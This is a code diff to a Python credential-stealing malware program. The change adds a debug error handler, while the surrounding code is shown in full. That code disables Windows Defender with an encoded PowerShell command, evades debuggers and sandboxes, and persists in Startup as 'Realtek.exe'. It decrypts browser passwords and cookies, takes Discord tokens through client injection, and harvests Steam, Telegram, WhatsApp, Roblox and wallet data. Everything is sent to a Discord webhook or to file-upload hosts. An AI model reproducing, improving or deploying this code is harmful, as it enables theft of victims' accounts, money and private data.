@@ -18,8 +18,7 @@ from pathlib import Path
 from locale import windows_locale
 from importlib import import_module
 
-# CONFIG 
-
+debug = '%Debug%'
 webhook = '%Webhook%'
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
@@ -69,6 +68,13 @@ except:
     
 import requests
 
+def error_Handler(err):
+    if debug == True:
+        print(err)
+        with open('error.txt', 'a')as f:
+            f.write(f"{err}\n")
+            
+    
 def sql_connect(database_path):
     conn = sqlite3.connect(database_path)
     return conn
@@ -118,8 +124,8 @@ def check_windows():
                     handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                     ctypes.windll.kernel32.TerminateProcess(handle, -1)
                     ctypes.windll.kernel32.CloseHandle(handle)
-                except:
-                    pass
+                except Exception as e:
+                    error_Handler(e)
             exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
         return True
 
@@ -127,16 +133,18 @@ def check_windows():
         ctypes.windll.user32.EnumWindows(winEnumHandler, None)
         time.sleep(0.5)
 
+    
 def self_delete():
     try:
         os.remove(__file__)
     except Exception as e:
-        pass
+        error_Handler(e)
 def Disable_Defender():
     try:
         cmd = b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
         subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-    except:
+    except Exception as e:
+        error_Handler(e)
         pass
             
 def check_ip():
@@ -161,7 +169,8 @@ def check_ip():
             if ip_address in blacklisted[::-1]:
                 exit_program('Blacklisted IP')
             return
-        except:
+        except Exception as e:
+            error_Handler(e)
             pass
         
 def CheckRegistry():
@@ -222,7 +231,8 @@ def webhook_tools():
         else:
             print('Wrong input')
             time.sleep(1)
-    except:
+    except Exception as e:
+        error_Handler(e)
         pass
 
 headers = {
@@ -317,7 +327,9 @@ def DecryptValue(Buffer, master_key=None):
             decrypted_pass = cipher.decrypt(payload)
             decrypted_pass = decrypted_pass[:-16]
             try: decrypted_pass = decrypted_pass.decode()
-            except:pass
+            except Exception as e:
+                error_Handler(e)
+                pass
             return decrypted_pass
 
 def steal_driver():
@@ -365,7 +377,8 @@ def steal_driver():
                 ]
             }
                     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-        except:
+        except Exception as e:
+            error_Handler(e)
             pass
 
 def ArchiSteamFarm():
@@ -393,7 +406,8 @@ def ArchiSteamFarm():
         return zip_filename
     try:
         found_folders = search_for_exe("archisteamfarm.exe", os.path.join(os.path.expanduser('~'), 'Desktop'))
-    except:
+    except Exception as e:
+        error_Handler(e)
         pass
     
     if found_folders:
@@ -429,8 +443,8 @@ def ArchiSteamFarm():
 
             LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         
-        except:
-            pass
+        except Exception as e:
+                    error_Handler(e)
 
 
 def check_python_or_convert(file_path):
@@ -522,10 +536,10 @@ def startup():
                 ats(new_path)
             except Exception as e:
                 pass
-        except:
-            pass
-    except:
-        pass
+        except Exception as e:
+            error_Handler(e)
+    except Exception as e:
+        error_Handler(e)
         
     try:
         if getattr(sys, 'frozen', False):
@@ -543,8 +557,8 @@ def startup():
             else:
                 startuppath = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.exe"
                 copy(path, startuppath)
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
     
 def LoadUrlib(hook, data='', files='', headers=''):
     
@@ -557,8 +571,8 @@ def LoadUrlib(hook, data='', files='', headers=''):
             else:
                 r = requests.post(hook, data=data)
                 return r
-        except: 
-            pass
+        except Exception as e:
+            error_Handler(e)
 
 Desc= 'drocsiD'[::-1]
 Dscptb= 'BTPdrocsiD'[::-1]
@@ -581,8 +595,8 @@ def NoDiscord():
                             with open(file_path, "w+", encoding="utf-8") as f:
                                 f.write('error')
 
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
 def idisc():
     try:
         ind = "sj.xedni"
@@ -602,8 +616,8 @@ def idisc():
                             inj_content = urlopen(inj_url).read().decode().replace("%WEBHOOK%", hook)
                             with open(file_path, "w", encoding="utf-8") as f:
                                 f.write(inj_content)
-    except: 
-        pass
+    except Exception as e:
+        error_Handler(e)
 
 pas = 'drowssaP'
 def systemInfo():
@@ -630,7 +644,8 @@ def systemInfo():
             sys_info = f"```{sys_info}```"
 
             return sys_info
-    except:
+    except Exception as e:
+        error_Handler(e)
         return 'Error'
 
 def avs():
@@ -651,8 +666,8 @@ def avs():
         return content
 
 
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
 
     return None
 
@@ -666,15 +681,22 @@ def run_command(command):
             .strip()
         )
         return result
-    except:
+    except Exception as e:
+        error_Handler(e)
         return 'N/A'
 
 def get_product_key():
-    try:return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault")
-    except:return "Couldn't get Product Name"
+    try:
+        return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault")
+    except Exception as e:
+        error_Handler(e)
+        return "Couldn't get Product Name"
 def get_product_name():
-    try:return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")
-    except:return "Couldn't get Product Name"
+    try:
+        return run_command("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")
+    except Exception as e:
+        error_Handler(e)
+        return "Couldn't get Product Name"
 PasswCount = 0
 def globalInfo():  
     pr = get_product_name()
@@ -683,7 +705,8 @@ def globalInfo():
     req = requests.get(url)
     try:
         user_agent = req.headers['User-Agent']
-    except:
+    except Exception as e:
+        error_Handler(e)
         user_agent = "Coudln't get User-Agent"
     data = req.json()
     ip = data['ip']
@@ -699,11 +722,13 @@ def globalInfo():
     postal = data['postal']
     try:
         computer_name = socket.gethostname()
-    except:
+    except Exception as e:
+        error_Handler(e)
         computer_name = 'error'
     try:
         cores = os.cpu_count()
-    except:
+    except Exception as e:
+        error_Handler(e)
         cores = 'Error'
     try:
         avss = avs()
@@ -711,34 +736,42 @@ def globalInfo():
         avss = 'Error gettings installed antivirus'
     try:
         system = os.name
-    except:
+    except Exception as e:
+        error_Handler(e)
         system = "Error getting os name!"
     try: 
         windll = ctypes.windll.kernel32
         language = windows_locale[ windll.GetUserDefaultUILanguage() ]
-    except:
+    except Exception as e:
+        error_Handler(e)
         language = "Coudln't get windows language"
-    try:
-        if system == 'Linux':
-            gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
-            
-        elif os.name == 'nt':  # Windows
-            try:
-                gpu_model = subprocess.check_output(["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"]).decode().strip()
-                total_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.total", "--format=csv,noheader,nounits"]).decode().strip()
-                free_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.free", "--format=csv,noheader,nounits"]).decode().strip()
-                used_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.used", "--format=csv,noheader,nounits"]).decode().strip()
-                temperature = subprocess.check_output(["nvidia-smi", "--query-gpu=temperature.gpu", "--format=csv,noheader,nounits"]).decode().strip()
+    def gpu():
+        try:
+            if system == 'Linux':
+                gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
+                return gpu_info
+                
+            elif os.name == 'nt': 
+                try:
+                    gpu_model = subprocess.check_output(["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"]).decode().strip()
+                    total_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.total", "--format=csv,noheader,nounits"]).decode().strip()
+                    free_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.free", "--format=csv,noheader,nounits"]).decode().strip()
+                    used_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.used", "--format=csv,noheader,nounits"]).decode().strip()
+                    temperature = subprocess.check_output(["nvidia-smi", "--query-gpu=temperature.gpu", "--format=csv,noheader,nounits"]).decode().strip()
 
-                gpu_info = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
-            except Exception as e:
-                gpu_info = f"Error retrieving GPU information: {e}"
-        else:
-            gpu_info = "Unsupported OS for GPU info retrieval"
-    except:
-        gpu_info = 'ERROR'
+                    gpu_info = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
+                    return gpu_info
+                except Exception as e:
+                    return f"Error retrieving GPU information: {e}"
+            else:
+                
+                return("Unsupported OS for GPU info retrieval")
+        except Exception as e:
+            error_Handler(e)
+            gpu_info = 'ERROR'
+            return gpu_info
         
-    return gpu_info
+
     globalinfo = f"""
     :flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`
     \n User-Agent : {user_agent}
@@ -750,7 +783,7 @@ def globalInfo():
     \n 💻 PC Information : 
     \n`{computer_name}`
     \n Cores: `{cores}` 
-    \nGPU  : ```{gpu}``` \nLatitude + Longitude  : ```{latitude}, {longitude}```
+    \nGPU  : ```{gpu()}``` \nLatitude + Longitude  : ```{latitude}, {longitude}```
     \n Installed antivirus :
     \n```{avss}``` """
     if len(globalinfo) > 1750:
@@ -801,8 +834,8 @@ def change_about_me(token):
         }
         url = "https://discord.com/api/v9/users/@me/profile"
         response = requests.patch(url, headers=headers, json=data)
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
 
 baddglist = [
     {"N": 'Active_Developer', 'V': 4194304, 'E': '<:active:1045283132796063794> '},
@@ -910,7 +943,8 @@ def UserInfo():
             try:
                 output = execute_command(command)
                 write_to_file(command, output)
-            except: pass
+            except Exception as e:
+                error_Handler(e)
         with open(output_file_path, "r") as f:
             lines = [line.replace('\t', '    ') for line in f]
 
@@ -920,8 +954,8 @@ def UserInfo():
         
             
         return upload_file(output_file_path)
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
 
 
 def uhqguild(token):
@@ -948,6 +982,7 @@ def uhqguild(token):
 
         return '\n'.join(uuuhq) if uuuhq else "`No HQ Guilds`"
     except Exception as e:
+        error_Handler(e)
         return "`No HQ Guilds`"
 
 
@@ -960,7 +995,8 @@ def get_uhq_friends(tokq, max_friends=5):
     try:
         response = requests.get("https://discord.com/api/v6/users/@me/relationships", headers=headers)
         friendlist = response.json()
-    except:
+    except Exception as e:
+        error_Handler(e)
         return False
 
     uhqlist = ''
@@ -1020,7 +1056,8 @@ def TikTokSession(cookie):
             url3 = f'https://www.tiktok.com/api/user/list/?count=1&minCursor=0&scene=67&secUid={uid}'
             data3 = requests.get(url3, headers=headers, cookies=cookies).json()
             subscriber = data3["total"]
-        except:
+        except Exception as e:
+            error_Handler(e)
             subscriber = "0"
 
         formatted_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))
@@ -1179,7 +1216,8 @@ def GetBilling(Tokq):
     try:
         with requests.get("https://discord.com/api/users/@me/billing/payment-sources", headers=headers) as response:
             billing_json = loads(response.read().decode())
-    except:
+    except Exception as e:
+        error_Handler(e)
         return False
     
     if not billing_json:
@@ -1412,15 +1450,18 @@ def gofileupload(path):
     try:
         data = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
         return data
-    except:
+    except Exception as e:
+        error_Handler(e)
         try:
             try:
                 gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
-            except:
+            except Exception as e:
+                error_Handler(e)
                 gofileserver = "store4"
             r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
             return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
-        except:
+        except Exception as e:
+            error_Handler(e)
             return False
 
 def catboxmoeupload(path, request_type='upload'):
@@ -1534,7 +1575,9 @@ def find_firefox_history_file():
         history_file_path = os.path.join(profile_path, "places.sqlite")
 
         return history_file_path if os.path.exists(history_file_path) else None
-    except:return None
+    except Exception as e:
+        error_Handler(e)
+        return None
 
 def find_opera_history_file():
     return find_history_file("Opera Software\\Opera Stable\\History", "~\\AppData\\Roaming\\{}")
@@ -1656,8 +1699,8 @@ def brohist():
     files_to_zip = []
     try:
         get_brave_history(temp_dir, files_to_zip)
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
     try:
         for browser_name, find_history_func in browsers.items():
             thread = threading.Thread(target=extract_history_with_timeout, args=(browser_name, find_history_func, temp_dir, files_to_zip))
@@ -1705,8 +1748,8 @@ def histup():
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
 Tokqs = []
 def getTokq(path, arg):
     try:
@@ -1724,8 +1767,8 @@ def getTokq(path, arg):
                                 if not Tokq in Tokqs:
                                     Tokqs += Tokq
                                     uploadTokq(Tokq, path)
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
 def GetDiscord(path, arg):
     try:
         if not os.path.exists(f"{path}/Local State"): return
@@ -1747,8 +1790,8 @@ def GetDiscord(path, arg):
                             if not TokqDecoded in Tokqs:
                                 Tokqs += TokqDecoded
                                 uploadTokq(TokqDecoded, path)
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
 
 
                 
@@ -1768,7 +1811,8 @@ def getPassw(path, arg, process):
                 decrypted_pass = cipher.decrypt(payload)
                 decrypted_pass = decrypted_pass[:-16]
                 try: decrypted_pass = decrypted_pass.decode()
-                except:pass
+                except Exception as e:
+                    error_Handler(e)
                 return decrypted_pass
         global Passw, PasswCount
         if not os.path.exists(path): return
@@ -1801,7 +1845,7 @@ def getPassw(path, arg, process):
                 PasswCount += 1
         writeforfile(Passw, 'passw')
     except Exception as e:
-        pass
+        error_Handler(e)
     
 def getinfo():
     try:
@@ -1837,7 +1881,7 @@ def getinfo():
             }
             LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except Exception as e:
-        pass
+        error_Handler(e)
 
 
 def steam_st():
@@ -1877,10 +1921,10 @@ def steam_st():
 
                 os.remove(f"{os.environ['TEMP']}\\steam_session.zip")
 
-            except:
-                pass
-    except:
-        pass
+            except Exception as e:
+                error_Handler(e)
+    except Exception as e:
+        error_Handler(e)
 
 import concurrent.futures
 
@@ -1898,8 +1942,8 @@ def upload_files_to_discord():
                 if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
                     file_path = os.path.join(path, file) 
                     file_paths.append(file_path)
-        except:
-            pass
+        except Exception as e:
+            error_Handler(e)
         urls = []
     
         with concurrent.futures.ThreadPoolExecutor() as executor:
@@ -1914,8 +1958,8 @@ def upload_files_to_discord():
                         urls.append((os.path.basename(file_path), url))
                     else:
                         pass
-            except:
-                pass
+            except Exception as e:
+                error_Handler(e)
             finally:
                 executor.shutdown(wait=True)
 
@@ -1964,7 +2008,8 @@ def bypass_token_protector():
             with config_path.open(errors="ignore") as f:
                 try:
                     item = load(f)
-                except:
+                except Exception as e:
+                    error_Handler(e)
                     return
 
             item.update({
@@ -1986,10 +2031,10 @@ def bypass_token_protector():
             with config_path.open('w') as f:
                 dump(item, f, indent=2, sort_keys=True)
 
-        except:
-            pass   
-    except:
-        pass
+        except Exception as e:
+            error_Handler(e) 
+    except Exception as e:
+        error_Handler(e)
     
 def list_files_in_directory(directory, level=0, max_display=100):
     file_list = []
@@ -2058,8 +2103,8 @@ def Get_Whatsapp(base_directory, zip_file_path):
             return list_files_in_directory(base_directory, level=0, max_display=10), zip_file_path
         else:
             return "Too many files to display", zip_file_path
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
     
 def Upload_Whatsapp():
     try:
@@ -2097,8 +2142,8 @@ def Upload_Whatsapp():
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
     
 def Bypass_Better_Discord():
     try:
@@ -2109,9 +2154,8 @@ def Bypass_Better_Discord():
 
         with open(BetterDiscord_Path, "w", encoding="cp437") as f:
             f.write(content)
-    except: 
-        pass
-
+    except Exception as e:
+        error_Handler(e)
 
 def ZipTelegram(path, arg, procc):
     try:
@@ -2136,15 +2180,16 @@ def ZipTelegram(path, arg, procc):
         lnik = upload_file(f'{pathC}/{name}.zip')
         os.remove(f"{pathC}/{name}.zip")
         OtherZip.append([arg, lnik])
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
     
 def close_process(procc):
     if close_proc == True:
         try:
             subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
             return True
-        except:
+        except Exception as e:
+            error_Handler(e)
             return False
         
     
@@ -2193,8 +2238,8 @@ def ZipThings(path, arg, procc):
             GamingZip.append([name, lnik])
         else:
             OtherZip.append([name, lnik])
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
 
 def srcs():
     try:
@@ -2224,7 +2269,7 @@ def srcs():
             os.remove(screenshot_path)
 
     except Exception as e:
-        pass
+        error_Handler(e)
 url_dict = {}
 data = []
 def paaz(filetype):
@@ -2301,8 +2346,8 @@ def paaz(filetype):
             }
 
             LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-        except:
-            pass
+        except Exception as e:
+            error_Handler(e)
         
         for thread in temp:
             thread.join()
@@ -2316,8 +2361,8 @@ def paaz(filetype):
             for file in ss:
                 try:
                     os.remove(file)
-                except:
-                    pass
+                except Exception as e:
+                    error_Handler(e)
 
         except Exception as e:
             pass
@@ -2351,8 +2396,8 @@ def frcook():
                     with open(file3, 'a') as f:
                         f.write(Cookies)
                             
-    except: 
-        pass
+    except Exception as e:
+        error_Handler(e)
 
 def GetAll(UserID: int) -> list:
     try:
@@ -2378,6 +2423,7 @@ def GetAll(UserID: int) -> list:
         else:
             raise ValueError("No 'data' key in the response.")
     except Exception as e:
+        error_Handler(e)
         return []
 
 def GetRAP(UserID):
@@ -2513,8 +2559,8 @@ def roblox(cookie):
             data = data[:character_limit - 3] + "..."
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
 def guilded(cookie):
     try:
         urlguild = "https://www.guilded.gg/api/me"
@@ -2555,9 +2601,10 @@ def guilded(cookie):
             pfp.replace('.webp', '.png')
             try:
                 pfp.replace('?w=450&h=450&ia=1','')
-            except:pass
-        except:
-            pass
+            except Exception as e:
+                error_Handler(e)
+        except Exception as e:
+            error_Handler(e)
         email = response["user"]["email"] if response["user"]["email"] else 'No Email'
         ids = response["user"]["id"] if response["user"]["id"] else 'Error getting ID'
         globalusername = response["user"]["name"] if response["user"]["name"] else 'No global username'
@@ -2630,7 +2677,8 @@ def guilded(cookie):
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-    except:pass
+    except Exception as e:
+        error_Handler(e)
 
 def patreon(cookie):
     try:
@@ -2732,7 +2780,8 @@ def patreon(cookie):
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-    except:pass
+    except Exception as e:
+        error_Handler(e)
     
 def twitch_session(auth_token, username):
     try:
@@ -2856,8 +2905,8 @@ def twitch_session(auth_token, username):
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
         
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
         
 def spotify(cookie):
     try:
@@ -2959,8 +3008,8 @@ def spotify(cookie):
             }
 
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
     
 def cokssite():
     try:
@@ -3030,14 +3079,13 @@ def cokssite():
                         l.append(first)
                         l.append(second)
                         first, second = '',''
-                except:
-                    pass
-                        
+                except Exception as e:
+                    error_Handler(e)
              
             for thread in Thread:
                 thread.join()
     except Exception as e:
-        pass
+        error_Handler(e)
      
 def getCook(path, arg, process):
     try:
@@ -3079,12 +3127,13 @@ def getCook(path, arg, process):
                 CookiCount += 1
 
         writeforfile(Cookies, 'cook')
-    except:
+    except Exception as e:
+        error_Handler(e)
         try:
             close = close_process(process[1]) 
             getCook(path, arg, process)
-        except:
-            pass
+        except Exception as e:
+            error_Handler(e)
     
 
             
@@ -3107,7 +3156,8 @@ def GatherZips(paths1, paths2, paths3):
 
         for thread in thttht: 
             thread.join()
-    except:pass
+    except Exception as e:
+        error_Handler(e)
     
     try:
         global WalletsZip, GamingZip, OtherZip
@@ -3149,14 +3199,14 @@ def GatherZips(paths1, paths2, paths3):
             }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except Exception as e:
-        pass
+        error_Handler(e)
 
 
 def dlself(script_path):
     try:
         os.remove(script_path)
-    except:
-        pass        
+    except Exception as e:
+        error_Handler(e)       
 def gatha():
     global PasswCount
     global injection
@@ -3197,8 +3247,8 @@ def gatha():
         defender = threading.Thread(target=Disable_Defender)
         defender.start()
         Second_Thread.append(defender)
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
     
     try:
         if antidebugging == True:
@@ -3207,15 +3257,15 @@ def gatha():
             First_Thread.append(ad)
         else:
             pass
-    except:
-        pass
+    except Exception as e:
+        error_Handler(e)
     
     if hidewindow == True:
         try:
             hide_console1()
             hide_console2()
-        except:
-            pass
+        except Exception as e:
+            error_Handler(e)
         
     if Drive == True:
         Drives = threading.Thread(target=steal_driver)
@@ -3225,8 +3275,8 @@ def gatha():
     for patt in browserPaths:
         try: 
             close_process(patt[1]) 
-        except:
-            pass
+        except Exception as e:
+            error_Handler(e)
          
     for patt in browserPaths:
         pa = threading.Thread(target=getPassw, args=[patt[0], patt[3], patt[1]])
@@ -3236,8 +3286,8 @@ def gatha():
     for patt in browserPaths: 
         try: 
             close_process(patt[1]) 
-        except:
-            pass
+        except Exception as e:
+            error_Handler(e)
         getc = threading.Thread(target=getCook, args=[patt[0], patt[4], patt[1]])
         getc.start()
         Second_Thread.append(getc)
@@ -3337,8 +3387,8 @@ def gatha():
             First_Thread.append(ij)
             
             DiscordStop = False
-        except:
-            pass
+        except Exception as e:
+            error_Handler(e)
 
     
     if DiscordStop == True:
@@ -3347,8 +3397,8 @@ def gatha():
             no.start()
             First_Thread.append(no)
             injection = False
-        except:
-            pass
+        except Exception as e:
+            error_Handler(e)
     
     for patt in discordPaths:
         di = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
